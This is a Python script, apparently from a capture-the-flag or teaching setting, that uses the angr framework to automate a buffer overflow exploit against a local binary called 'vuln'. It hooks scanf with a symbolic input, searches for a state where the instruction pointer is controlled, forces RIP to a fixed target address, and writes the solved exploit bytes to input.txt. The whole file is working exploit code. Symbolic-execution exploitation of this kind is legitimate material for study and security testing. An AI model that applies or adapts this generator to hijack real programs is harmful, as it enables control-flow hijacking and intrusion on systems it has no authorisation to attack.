#!/usr/bin/env python3
"""
Buffer Overflow Exploit Generator
This script uses the angr framework to automatically find buffer overflow vulnerabilities
in a binary file. It symbolically executes the program to find states where the instruction
pointer (RIP) can be controlled, indicating a potential buffer overflow.
"""

import angr
import claripy
import sys

# Initialize the binary analysis project using angr
proj = angr.Project("./vuln")

# Create an initial state at the program's entry point
init_state = proj.factory.entry_state()

# Set up the symbolic buffer
# 90 bytes * 8 bits per byte = 720 bits total size for our input buffer
bitvector_size = 90*8
buffer = claripy.BVS('buffer', bitvector_size)  # Create a symbolic bitvector to represent user input

class ScanfReplace(angr.SimProcedure):
    """
    Custom SimProcedure to handle scanf calls
    This class replaces the scanf function in the binary with our own implementation
    that uses symbolic values instead of concrete input
    """
    def run(self, format_string, scanf_addr):
        # Store our symbolic buffer at the address where scanf would normally write
        self.state.memory.store(scanf_addr, buffer)

# Address of the scanf function we want to hook
hook_addr = 0x401040

# Address we want to reach (likely a critical function or return address)
target_addr = 0x401146

# Replace scanf with our custom implementation
proj.hook(hook_addr, ScanfReplace())

# Create a simulation manager to explore program states
sim = proj.factory.simgr(init_state)

# Keep stepping through the program until we find an unconstrained state
# An unconstrained state is one where we can control the instruction pointer
while not sim.unconstrained:
    sim.step()

# Get the first unconstrained state we found
state = sim.unconstrained[0]

# Add constraint to ensure we reach our target address
state.add_constraints(state.regs.rip == target_addr)

# Solve for concrete values that satisfy our constraints
result = state.solver.eval(buffer, cast_to=bytes)

# Output the exploit bytes
print("USE THE FOLLOWING INPUT BYTES TO EXPLOIT THE OVERFLOW:")
print(result)

# Save the exploit to a file for later use
with open("input.txt", "wb") as input_file:
    input_file.write(result)

print("SAVED AS input.txt")
